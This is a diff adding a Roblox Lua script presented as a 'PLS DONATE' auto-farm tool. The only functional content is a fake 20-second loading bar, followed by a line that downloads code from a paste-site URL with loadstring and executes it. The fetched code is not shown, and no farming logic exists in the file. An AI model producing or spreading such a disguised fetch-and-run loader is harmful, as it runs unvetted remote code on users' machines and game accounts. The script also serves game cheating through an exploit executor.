@@ -1,0 +1,64 @@
+-- PLS DONATE AUTO FARM GUI (20s Load + Run Script + Close)
+local gui = Instance.new("ScreenGui")
+gui.Name = "PLSDonateAutoFarmGUI"
+gui.ResetOnSpawn = false
+pcall(function() gui.Parent = game:GetService("CoreGui") end)
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 120)
+frame.Position = UDim2.new(0.5, -200, 0.5, -60)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+local frameCorner = Instance.new("UICorner", frame)
+frameCorner.CornerRadius = UDim.new(0, 18)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0, 28)
+title.Position = UDim2.new(0, 10, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "PLS DONATE AUTO FARM"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = frame
+
+-- Loading Bar Background
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(1, -20, 0, 25)
+barBg.Position = UDim2.new(0, 10, 0, 70)
+barBg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
+barBg.Parent = frame
+
+local barBgCorner = Instance.new("UICorner", barBg)
+barBgCorner.CornerRadius = UDim.new(0, 12)
+
+-- Loading Bar Fill
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(145, 80, 255)
+bar.BorderSizePixel = 0
+bar.Parent = barBg
+
+local barCorner = Instance.new("UICorner", bar)
+barCorner.CornerRadius = UDim.new(0, 12)
+
+-- Load in 20s, then run script & destroy GUI
+spawn(function()
+    for i = 0, 100 do
+        local percent = i / 100
+        bar:TweenSize(UDim2.new(percent, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
+        wait(0.2)
+    end
+    wait(1)
+    loadstring(game:HttpGet("http://vpaste.net/hsf92"))()
+    gui:Destroy()
+end)
